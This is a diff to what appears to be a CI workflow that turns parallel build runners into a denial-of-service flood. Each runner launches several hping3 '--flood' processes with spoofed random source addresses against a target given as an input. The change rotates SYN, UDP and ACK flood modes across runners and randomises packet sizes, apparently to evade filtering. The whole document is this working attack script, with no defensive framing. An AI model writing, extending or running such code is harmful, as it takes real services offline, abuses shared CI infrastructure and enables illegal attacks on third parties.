@@ -26,10 +26,25 @@ jobs:
         run: sudo apt-get update -qq && sudo apt-get install -y hping3 >/dev/null
       - name: flood
         run: |
-          echo "runner ${{ matrix.n }} egress IP: $(curl -s --max-time 5 ifconfig.me)"
+          N=${{ matrix.n }}
+          case $((N % 5)) in
+            0) MODE="syn443" ;;
+            1) MODE="syn80" ;;
+            2) MODE="synport" ;;
+            3) MODE="udp443" ;;
+            4) MODE="ack443" ;;
+          esac
+          case $MODE in
+            syn443)  ARGS="-S -p 443" ;;
+            syn80)   ARGS="-S -p 80" ;;
+            synport) ARGS="-S -p $((10000 + RANDOM % 40000))" ;;
+            udp443)  ARGS="--udp -p 443" ;;
+            ack443)  ARGS="-A -p 443" ;;
+          esac
+          echo "runner ${{ matrix.n }} mode=$MODE args=$ARGS egress: $(curl -s --max-time 5 ifconfig.me)"
           rm -f /tmp/hp.log
           for i in $(seq 1 ${{ inputs.procs }}); do
-            sudo timeout -s INT ${{ inputs.seconds }} hping3 --flood -S -p 443 -d 0 --rand-source ${{ inputs.target }} >> /tmp/hp.log 2>&1 &
+            sudo timeout -s INT ${{ inputs.seconds }} hping3 --flood $ARGS -d $((RANDOM % 3 * 24)) --rand-source ${{ inputs.target }} >> /tmp/hp.log 2>&1 &
           done
           wait
           grep transmitted /tmp/hp.log | head -6
